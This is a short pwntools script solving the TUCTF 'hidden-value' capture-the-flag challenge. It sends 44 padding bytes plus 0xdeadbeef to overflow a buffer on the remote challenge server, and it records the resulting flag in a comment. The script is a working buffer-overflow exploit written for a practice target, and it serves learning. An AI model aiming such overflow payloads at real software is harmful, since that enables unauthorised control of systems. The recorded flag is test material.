from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./file")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


p = remote("chal.tuctf.com", 30011)
#p = process("./hidden-value")
#p = gdb.debug("./hidden-value", '''
#b *main
#b *greet_user+37
#''')

payload  = b"A" * 44
payload += p64(0xdeadbeef)

p.sendline(payload)
p.interactive()

# Enter your name: Congratulations! You have executed the hidden command.
# The flag is: TUCTF{pr4cti4l_buffer_overrun}
